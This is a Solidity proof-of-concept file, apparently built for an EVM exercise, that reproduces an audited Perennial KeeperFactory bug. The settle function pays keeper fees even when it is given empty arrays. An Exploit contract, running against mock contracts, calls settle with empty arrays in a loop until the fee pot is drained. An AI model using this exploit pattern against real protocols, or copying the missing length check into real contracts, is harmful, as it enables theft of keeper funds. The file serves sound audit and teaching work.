// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Perennial KeeperFactory.settle — empty arrays still pay the keeper (Sherlock 2023-10, H-4).
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: settle() checks that the four arrays match and that calldata is not
    stuffed, but not that ids.length != 0. The keep modifier (Kept.sol) then pays
    (gas * multiplierBase + bufferBase) * block.basefee * ethPrice anyway.
    On L1, _calldataFee returns 0. This reduction sets multiplierBase to 0 and
    bufferBase to 1e18 so the unearned fee is exactly bufferBase * block.basefee
    (7 DSU at basefee 7) and does not depend on gas accounting. A non-zero
    multiplier would only add more. The blamed settle body is the audited function. */

error KeeperFactoryInvalidSettleError();

interface IMarket {}

interface IKeeperOracle {
    function settle(IMarket market, uint256 version, uint256 maxCount) external;
}

contract DSU {
    string public constant symbol = "DSU";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// Chainlink ETH/USD-shaped feed. answer 1e8 => 1 keeper token per 1 ETH.
contract EthFeed {
    function latestRoundData() external pure returns (uint80, int256, uint256, uint256, uint80) {
        return (1, 1e8, 0, 0, 1);
    }
}

/// Oracle-factory fee pot. claim() is KeeperFactory._raiseKeeperFee's pull.
contract FeePot {
    DSU public token;
    address public factory;

    constructor(DSU token_) {
        token = token_;
    }

    function bind(address factory_) external {
        require(factory == address(0), "bound");
        factory = factory_;
    }

    function claim(uint256 amount) external {
        require(msg.sender == factory, "factory");
        token.transfer(factory, amount);
    }
}

contract MockKeeperOracle is IKeeperOracle {
    KeeperFactory public factory;

    constructor(KeeperFactory factory_) {
        factory = factory_;
    }

    function settle(IMarket, uint256, uint256) external {
        factory.noteSettled();
    }
}

contract KeeperFactory {
    struct KeepConfig {
        uint256 multiplierBase;
        uint256 bufferBase;
        uint256 multiplierCalldata;
        uint256 bufferCalldata;
    }

    DSU public dsu;
    EthFeed public feed;
    FeePot public pot;
    mapping(bytes32 => address) public oracles;
    address public callbackOracle;
    uint256 public accountsSettled;
    uint256 public lastFee;

    uint256 internal immutable _keepSettleMultiplierBase;
    uint256 internal immutable _keepSettleBufferBase;
    uint256 internal immutable _keepSettleMultiplierCalldata;
    uint256 internal immutable _keepSettleBufferCalldata;

    constructor(DSU dsu_, EthFeed feed_, FeePot pot_) {
        dsu = dsu_;
        feed = feed_;
        pot = pot_;
        pot.bind(address(this));
        _keepSettleMultiplierBase = 0;
        _keepSettleBufferBase = 1e18;
        _keepSettleMultiplierCalldata = 0;
        _keepSettleBufferCalldata = 0;
    }

    function registerOracle(bytes32 id, address oracle) external {
        oracles[id] = oracle;
        callbackOracle = oracle;
    }

    function noteSettled() external {
        require(msg.sender == callbackOracle, "oracle");
        accountsSettled += 1;
    }

    function settleKeepConfig() public view returns (KeepConfig memory) {
        return KeepConfig(
            _keepSettleMultiplierBase,
            _keepSettleBufferBase,
            _keepSettleMultiplierCalldata,
            _keepSettleBufferCalldata
        );
    }

    /// Fixed18Lib.ratio(answer, 1e8), wrapped as UFixed18. 1e8 answer => 1e18.
    function _etherPrice() public view returns (uint256) {
        (, int256 answer,,,) = feed.latestRoundData();
        return uint256(answer) * 1e18 / 1e8;
    }

    /// Kept._baseFee: (from(gas) * multiplier + from(buffer)) * block.basefee.
    function _baseFee(uint256 applicableGas, uint256 multiplierBase, uint256 bufferBase) public view returns (uint256) {
        uint256 gasTerm = applicableGas * multiplierBase / 1e18;
        uint256 sum = gasTerm + bufferBase * 1e18;
        return sum * block.basefee / 1e18;
    }

    /// L1 Kept._calldataFee is virtual and returns 0.
    function _calldataFee(bytes calldata, uint256, uint256) public pure returns (uint256) {
        return 0;
    }

    function previewFee() public view returns (uint256) {
        uint256 baseFee = _baseFee(0, _keepSettleMultiplierBase, _keepSettleBufferBase);
        return baseFee * _etherPrice() / 1e18;
    }

    modifier keep(KeepConfig memory config, bytes calldata applicableCalldata, uint256 applicableValue, bytes memory data) {
        uint256 startGas = gasleft();
        _;
        uint256 applicableGas = startGas - gasleft();
        uint256 baseFee = _baseFee(applicableGas, config.multiplierBase, config.bufferBase);
        uint256 calldataFee = _calldataFee(applicableCalldata, config.multiplierCalldata, config.bufferCalldata);
        uint256 keeperFee = (applicableValue + baseFee + calldataFee) * _etherPrice() / 1e18;
        _raiseKeeperFee(keeperFee, data);
        _push(msg.sender, keeperFee);
        lastFee = keeperFee;
    }

    /// KeeperFactory._raiseKeeperFee: pull the fee from the oracle factory.
    function _raiseKeeperFee(uint256 keeperFee, bytes memory) internal {
        pot.claim(keeperFee);
    }

    /// Token18.push: forward the keeper token to the caller.
    function _push(address to, uint256 amount) internal {
        dsu.transfer(to, amount);
    }

    /// @notice Performs a list of local settlement callbacks.
    /// @dev Pays a keeper incentive if the call does not revert. Audited body, verbatim.
    function settle(bytes32[] memory ids, IMarket[] memory markets, uint256[] memory versions, uint256[] memory maxCounts)
        external
        virtual
        keep(settleKeepConfig(), msg.data, 0, "")
    {
        // @> VULN: ids.length == 0 is not rejected, so keep pays for no settlement
        if (
            ids.length != markets.length ||
            ids.length != versions.length ||
            ids.length != maxCounts.length ||
            // Prevent calldata stuffing
            abi.encodeCall(KeeperFactory.settle, (ids, markets, versions, maxCounts)).length != msg.data.length
        ) revert KeeperFactoryInvalidSettleError();

        for (uint256 i; i < ids.length; i++)
            IKeeperOracle(address(oracles[ids[i]])).settle(markets[i], versions[i], maxCounts[i]);
    }
}

contract Exploit {
    DSU public dsu; // CREATE nonce 1
    EthFeed public feed; // CREATE nonce 2
    FeePot public pot; // CREATE nonce 3
    KeeperFactory public factory; // CREATE nonce 4
    uint256 public stolenAmount;

    constructor() {
        dsu = new DSU();
        feed = new EthFeed();
        pot = new FeePot(dsu);
        factory = new KeeperFactory(dsu, feed, pot);
    }

    function run() external {
        uint256 fee = factory.previewFee();
        uint256 potValue = fee * 5;
        dsu.mint(address(pot), potValue);
        uint256 beforeBal = dsu.balanceOf(msg.sender);
        bytes32[] memory ids = new bytes32[](0);
        IMarket[] memory markets = new IMarket[](0);
        uint256[] memory versions = new uint256[](0);
        uint256[] memory maxCounts = new uint256[](0);
        while (dsu.balanceOf(address(pot)) >= fee) {
            factory.settle(ids, markets, versions, maxCounts);
        }
        require(factory.accountsSettled() == 0, "settled");
        require(dsu.balanceOf(address(pot)) == 0, "pot");
        uint256 haul = dsu.balanceOf(address(this));
        dsu.transfer(msg.sender, haul);
        require(fee == 7e18, "fee");
        require(haul == 35e18, "haul");
        require(dsu.balanceOf(msg.sender) - beforeBal == 35e18, "stolen");
        stolenAmount = haul;
    }
}
